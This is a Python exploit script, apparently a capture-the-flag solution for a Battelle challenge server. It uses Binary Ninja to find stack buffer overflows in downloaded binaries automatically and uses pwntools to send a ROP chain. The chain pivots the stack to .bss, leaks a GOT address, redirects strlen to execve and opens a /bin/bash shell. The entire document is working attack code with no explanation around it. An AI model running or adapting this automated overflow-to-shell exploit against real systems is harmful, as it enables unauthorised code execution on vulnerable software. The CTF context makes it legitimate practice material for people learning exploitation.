from pwn import *
from binaryninja import BinaryViewType, RegisterValueType, MediumLevelILOperation

def find_vuln(binary_path):
	bv = BinaryViewType.get_view_of_file(binary_path)
	read = bv.get_functions_by_name("read")[0]
	for ref in bv.get_code_refs(read.start):
		hlil = ref.function.get_llil_at(ref.address).hlil
		dest_buff = ref.function.get_parameter_at(ref.address,None,1)
		if dest_buff.type == RegisterValueType.StackFrameOffset:
			# buffer is on the stack
			stack_frame_size = abs(dest_buff.value)
			nbytes = ref.function.get_parameter_at(ref.address,None,2).value
			if nbytes > stack_frame_size:
				print(f"[!] Overflow at {hex(ref.address)}: {hlil}")
				print(f"\tBuffer size: {stack_frame_size}\n\tRead Size: {nbytes}")
				return bv,stack_frame_size, ref.address

def get_inputs(bv,vuln_address,inputs):
	func = bv.get_functions_containing(vuln_address)[0]
	ref = next(bv.get_code_refs(func.start))
	mlil_index = ref.function.get_llil_at(ref.address).mlil.instr_index
	for mlil_instruction in ref.function.mlil_instructions:
		if mlil_instruction.operation == MediumLevelILOperation.MLIL_IF:
			if mlil_index == mlil_instruction.false:
				param = mlil_instruction.hlil.operands[0].operands[0].params[0]
				addr = bv.reader().read32(param.operands[0].constant)
				data_string = bv.get_ascii_string_at(addr,min_length=3).value.encode()
			else:
				data_string = b"g"
			inputs.append(data_string)
			return get_inputs(bv,ref.address,inputs)
  
io = remote("ctf.battelle.org", 30042)
[io.readline() for _ in range(5)]
for x in range(5):
	binary = io.readuntil(b"********************************",drop=True)
	with open(f"binary{x}","wb") as f:
		f.write(binary)
	bv,size,vuln_address = find_vuln(f"./binary{x}")
	inputs = []

	get_inputs(bv,vuln_address,inputs)
	inputs = inputs[::-1]
	print("[!] Inputs required: ",inputs)  

	context.binary = elf = ELF(f"./binary{x}")
	context.log_level = "debug"
	# io = elf.process()
	# gdb.attach(io)

	for inpt in inputs:
		io.sendline(inpt)
		io.clean()

	rop = ROP(elf)
	leave_ret = rop.find_gadget(['leave','ret'])[0]
	read = elf.plt['read']
	add_eax = bv.find_next_data(bv.start,b"\x03\x02\x7a")
	jmp_eax = bv.find_next_data(bv.start,b"\xff\xe0")
	pop_3 = rop.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]
  
	# pivot to bss
	payload = b"A"*(size-4)
	payload += p32(elf.bss()) #ebp
	payload += p32(read)
	payload += p32(leave_ret)
	payload += p32(0)
	payload += p32(elf.bss(4))
	payload += p32(elf.got['read'])
  
	io.send(payload)
	io.clean()
  
	# call write(1,read_GOT,4)
	payload2 = b""
	payload2 += p32(add_eax)
	payload2 += p32(jmp_eax)
	payload2 += p32(pop_3)
	payload2 += p32(1)
	payload2 += p32(elf.got['read'])
	payload2 += p32(4)
	# read execve into strlen
	payload2 += p32(read)
	payload2 += p32(pop_3)
	payload2 += p32(0)
	payload2 += p32(elf.got['strlen'])
	payload2 += p32(4)
	# call execve
	payload2 += p32(elf.plt['strlen'])
	payload2 += b"AAAA" # Dummy data
	payload2 += p32(elf.bss(17*4))
	payload2 += p32(0)*2
	payload2 += b"/bin/bash\x00"
	payload2 = payload2.ljust(0xa0,b"\x90")
  
	io.send(payload2)
	leak = u32(io.read(4))
	print("[!] Leak:", hex(leak))
	execve = leak-162352
	print("[!] Execve:", hex(execve))
  
	io.send(p32(execve))
	io.clean()

	# io.sendline("base64 /lib32/libgrail.so")
	# libgrail = io.readuntil(b"==").replace(b"\n",b"")
	# with open("libgrail.b64","wb") as f:
	# f.write(libgrail)

	io.sendline("echo DONE>log;exit")

	if x == 4:
		io.interactive()
	else:
		io.readuntil(b"********************************\n")

